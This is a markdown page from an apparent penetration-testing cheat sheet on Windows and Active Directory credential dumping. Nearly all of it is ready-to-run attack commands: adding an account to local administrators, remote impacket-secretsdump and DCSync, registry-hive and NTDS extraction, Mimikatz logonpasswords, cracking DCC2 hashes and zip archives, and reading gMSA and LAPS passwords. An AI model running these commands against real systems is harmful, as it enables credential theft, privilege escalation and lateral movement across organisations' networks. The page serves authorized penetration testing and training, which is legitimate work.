---
title: Credential dumping
order: 4
tags: [ad, secretsdump, mimikatz, dcc2, lsa, sam, hashes]
---

## Enable remote dumping

From an administrator or SYSTEM context, promote a known account so remote dumps and command execution work cleanly:

```cmd
net localgroup administrators '{{USER}}' /add
```

Group membership refreshes only on a new logon; open a fresh session afterwards. See [Create a local administrator](windows/windows-privesc#create-a-local-administrator) for the full pattern. [Microsoft net localgroup](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-localgroup).

## Secretsdump remotely

With administrator access, dump SAM, LSA secrets and cached logons from the target box in one run:

```bash
impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{RHOST}}
```

Save the whole output. LSA `DefaultPassword` and `_SC_*` entries are plaintext pivots; cached `$DCC2$` lines crack offline. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).

## Secretsdump cheat sheet

Choose the source matching the access you have. Save complete output and label every credential with the host and authority it came from.

```bash
# Remote password
impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{RHOST}}
# Remote NT hash
impacket-secretsdump -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
# DCSync with replication rights
impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{DC}}
# Local hives or NTDS
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

LSA `DefaultPassword` and `_SC_*` entries are plaintext pivots; SAM lines give local hashes; cached `$DCC2$` lines crack offline. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).

## NTDS and backup collection

Use when administrator or backup rights permit host-side collection. Prefer the least destructive source and record where every file came from.

```cmd
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
ntdsutil.exe "activate instance ntds" "ifm" "create full C:\Windows\Temp\IFM" quit quit
```

```bash
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
impacket-secretsdump -ntds NTDS.dit -system system.hive LOCAL
```

A live IFM path can also be copied back for offline parsing. Verify the recovered hashes against the intended hosts before reuse.

## Mimikatz logon passwords

Run in the target session as administrator or SYSTEM:

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Lists in-memory logons: NTLM hashes and plaintext for anyone with a session on the host. Upload the binary with an existing [Evil-WinRM session](services/remote-access#winrm-checks-and-shell). [Mimikatz sekurlsa module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa).

## Secretsdump from hives

Offline dump of downloaded hives, including `C:\Windows.old\Windows\System32` and backup copies:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Old local-account hashes replay by [pass-the-hash](active-directory/credential-access#pass-the-hash) where the account still exists. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).

## Crack cached logons

Cached domain logons (`$DCC2$` lines from secretsdump) crack like any other hash:

```bash
hashcat -m 2100 dcc2.txt /home/kali/tools/wordlists/rockyou.txt
```

Mode 2100 expects `$DCC2$10240#username#hash` for the 10240-iteration format.
Preserve the original username, iteration count and hash; extract the `$DCC2$`
portion from surrounding tool labels without changing it. DCC2 is an offline
cached-logon verifier, not an NT hash for pass-the-hash. [Hashcat format examples](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-example-hashes.md).

## Read gMSA managed passwords

On Kali, use an account with verified permission to read the managed-password
attribute. NetExec's gMSA workflow uses LDAPS; a domain login alone is insufficient.

```bash
nxc ldap '{{DC}}' -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' --gmsa
```

Record the gMSA name, permitted reader and returned material. Confirm the account's
actual service/host rights before reuse. [NetExec gMSA](https://www.netexec.wiki/ldap-protocol/dump-gmsa).

## Crack a protected archive

For password-protected archives recovered from shares, before attempting reuse:

```bash
zip2john site.zip > zip.hash
john --format=zip --wordlist=/home/kali/tools/wordlists/rockyou.txt zip.hash
```

Other object types have their own helpers, e.g. keepass2john. [John the Ripper documentation](https://www.openwall.com/john/doc/).

## DCSync through the domain controller

Requires Replicating Directory Changes permissions, normally a highly privileged or specifically delegated account. Target DC rather than an arbitrary member host.

```bash
impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{DC}}
```

Save the complete output and limit later credential tests to intended hosts. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).

## Read LAPS passwords

Only an account authorized to read the LAPS password attribute can return it. NetExec's laps module checks accessible computer attributes through LDAP.

```bash
nxc ldap {{DC}} -u '{{USER}}' -p '{{PASS}}' -M laps
```

Treat each recovered local administrator password as host-specific unless reuse is explicitly verified. [Microsoft Windows LAPS access control](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview), [NetExec modules](https://www.netexec.wiki/ldap-protocol/list-modules).
